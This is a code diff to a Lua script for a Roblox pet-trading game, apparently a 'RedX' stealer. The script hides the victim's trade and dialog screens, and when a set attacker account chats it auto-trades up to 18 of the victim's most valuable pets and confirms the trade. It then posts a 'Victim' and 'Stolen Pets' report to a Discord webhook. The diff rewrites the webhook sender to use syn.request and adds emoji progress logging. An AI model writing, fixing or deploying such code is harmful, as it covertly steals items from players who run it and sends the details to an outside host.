@@ -395,43 +395,41 @@ local embed = {
     }
 }
 
-function SendMessageEMBED(url, embed_data, bool)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    local data = {
-        username = "RedX | Hit",
-        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
-        embeds = {
-            {
-                title = embed_data.title,
-                color = embed_data.color,
-                fields = embed_data.fields,
-                timestamp = DateTime.now():ToIsoDate()
-            }
-        }
-    }
-    
-    if bool then
-        data.content = "-- @everyone\n" .. TeleportScript
-    end
-
-    local body = http:JSONEncode(data)
-    
+-- SIMPLE WEBHOOK FUNCTION THAT ACTUALLY WORKS
+function SendWebhook(url, data)
     local success, result = pcall(function()
-        return request({
+        local json = game:GetService("HttpService"):JSONEncode(data)
+        return syn.request({
             Url = url,
             Method = "POST",
-            Headers = headers,
-            Body = body
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = json
         })
     end)
     
-    if not success then
-        warn("Failed to send webhook: " .. tostring(result))
+    if success then
+        print("✅ Webhook sent successfully!")
+        return true
+    else
+        print("❌ Webhook failed: " .. tostring(result))
+        return false
     end
+end
+
+function SendMessageEMBED(url, embed_data, isEveryone)
+    local data = {
+        username = "RedX | Hit",
+        avatar_url = "https://i.pinimg.com/736x/d2/cd/f2/d2cdf2a8169c9e444ed5402c67fce98d.jpg",
+        embeds = {embed_data}
+    }
+    
+    if isEveryone then
+        data.content = "@everyone"
+    end
+    
+    return SendWebhook(url, data)
 end
 
 -- Function to send stolen pets information
@@ -458,26 +456,27 @@ function SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
     end
 
     local stolenEmbed = {
-        ["title"] = "**TRADE COMPLETED** :inbox_tray:",
-        ["color"] = tonumber(0x00FF00),
-        ["fields"] = {
+        title = "**TRADE COMPLETED** :inbox_tray:",
+        color = 0x00FF00,
+        fields = {
             {
-                ["name"] = "〘:bust_in_silhouette:〙**Trade Details**",
-                ["value"] = "```lua\n" ..
-                            "Victim      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
-                            "Receiver    : " .. tostring(ReceiverName) .. "\n" ..
-                            "Total Value : " .. string.format("%d$", math.floor(totalStolenValue)) .. "\n" ..
-                            "Pets Stolen : " .. tostring(#stolenPets) .. "```"
+                name = "〘:bust_in_silhouette:〙**Trade Details**",
+                value = "```lua\n" ..
+                        "Victim      : " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                        "Receiver    : " .. tostring(ReceiverName) .. "\n" ..
+                        "Total Value : " .. string.format("%d$", math.floor(totalStolenValue)) .. "\n" ..
+                        "Pets Stolen : " .. tostring(#stolenPets) .. "```"
             },
             {
-                ["name"] = "〘:gift:〙**Stolen Pets**",
-                ["value"] = "```lua\n" .. (stolenPetsText ~= "" and stolenPetsText or "No pets stolen") .. "```"
+                name = "〘:gift:〙**Stolen Pets**",
+                value = "```lua\n" .. (stolenPetsText ~= "" and stolenPetsText or "No pets stolen") .. "```"
             }
-        }
+        },
+        timestamp = DateTime.now():ToIsoDate()
     }
 
-    print("Sending stolen pets info...") -- Debug
-    SendMessageEMBED(Webhook, stolenEmbed, false)
+    print("📤 Sending stolen pets info...")
+    return SendMessageEMBED(Webhook, stolenEmbed, false)
 end
 
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
@@ -487,10 +486,13 @@ game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = fals
 local sent = false
 
 local function TradeIncoming(ReceiverName)
-    if sent then return end
+    if sent then 
+        print("❌ Trade already in progress!")
+        return 
+    end
     sent = true
     
-    print("Starting trade with: " .. ReceiverName) -- Debug
+    print("🎯 Starting trade with: " .. ReceiverName)
     
     local RouterClient = Loaders("RouterClient")
     local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
@@ -524,14 +526,15 @@ local function TradeIncoming(ReceiverName)
     
     -- Send trade request
     moveGuiOffscreen()
+    print("📨 Sending trade request...")
     SendTrade:FireServer(game.Players[ReceiverName])
-    print("Trade request sent to: " .. ReceiverName) -- Debug
     wait(5)
     
     -- Add pets to trade (best ones first)
     local petCount = 0
     local petLimit = 18
     
+    print("🎁 Adding pets to trade...")
     for _, petInfo in ipairs(sortedPets) do
         if petCount < petLimit then
             AddPetRemote:FireServer(petInfo.uid)
@@ -541,8 +544,8 @@ local function TradeIncoming(ReceiverName)
                 properties = petInfo.properties
             })
             petCount = petCount + 1
-            print("Added pet to trade: " .. petInfo.name) -- Debug
-            wait(0.3) -- Small delay to avoid rate limits
+            print("➕ Added pet: " .. petInfo.name .. " (" .. math.floor(petInfo.value) .. "$)")
+            wait(0.3)
         else
             break
         end
@@ -554,34 +557,41 @@ local function TradeIncoming(ReceiverName)
         totalStolenValue = totalStolenValue + pet.value
     end
     
-    print("Total stolen value: " .. totalStolenValue) -- Debug
+    print("💰 Total stolen value: " .. math.floor(totalStolenValue) .. "$")
     
     -- Accept negotiation and confirm trade
+    print("✅ Accepting negotiation...")
     wait(3)
     AcceptNegotiationRemote:FireServer()
-    print("Negotiation accepted") -- Debug
     
+    print("✅ Confirming trade...")
     wait(3)
     ConfirmTradeRemote:FireServer()
-    print("Trade confirmed") -- Debug
     
     -- Send stolen pets information
-    wait(2) -- Wait a bit before sending webhook
+    print("📤 Sending trade results to Discord...")
+    wait(2)
     SendStolenPets(ReceiverName, stolenPets, totalStolenValue)
-    print("Stolen pets info sent to Discord") -- Debug
 end
 
 -- Send initial embed
-SendMessageEMBED(Webhook, embed, true)
-print("Initial embed sent to Discord") -- Debug
+print("🚀 Sending initial webhook...")
+local initialEmbed = {
+    title = "New HIT with **RedX**",
+    color = 0x3365FF,
+    fields = embed.fields,
+    timestamp = DateTime.now():ToIsoDate()
+}
+
+SendMessageEMBED(Webhook, initialEmbed, true)
 
 -- Listen for players
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username then
-        print("Main user joined: " .. Username) -- Debug
+        print("🎯 Main user joined: " .. Username)
         player.Chatted:Connect(function(msg)
             if not sent then
-                print("Chat trigger received: " .. msg) -- Debug
+                print("💬 Chat trigger received: " .. msg)
                 TradeIncoming(Username)
             end
         end)
@@ -590,10 +600,10 @@ end)
 
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username2 and Username2 ~= "None" then
-        print("Alt user joined: " .. Username2) -- Debug
+        print("🎯 Alt user joined: " .. Username2)
         player.Chatted:Connect(function(msg)
             if not sent then
-                print("Chat trigger received: " .. msg) -- Debug
+                print("💬 Chat trigger received: " .. msg)
                 TradeIncoming(Username2)
             end
         end)
@@ -601,23 +611,26 @@ game.Players.PlayerAdded:Connect(function(player)
 end)
 
 -- Check if users are already in game
+print("🔍 Checking for existing players...")
 for _, player in pairs(game.Players:GetPlayers()) do
     if player.Name == Username then
-        print("Main user already in game: " .. Username) -- Debug
+        print("🎯 Main user already in game: " .. Username)
         player.Chatted:Connect(function(msg)
             if not sent then
-                print("Chat trigger received: " .. msg) -- Debug
+                print("💬 Chat trigger received: " .. msg)
                 TradeIncoming(Username)
             end
         end)
     end
     if player.Name == Username2 and Username2 ~= "None" then
-        print("Alt user already in game: " .. Username2) -- Debug
+        print("🎯 Alt user already in game: " .. Username2)
         player.Chatted:Connect(function(msg)
             if not sent then
-                print("Chat trigger received: " .. msg) -- Debug
+                print("💬 Chat trigger received: " .. msg)
                 TradeIncoming(Username2)
             end
         end)
     end
 end
+
+print("✅ Script loaded successfully! Waiting for triggers...")
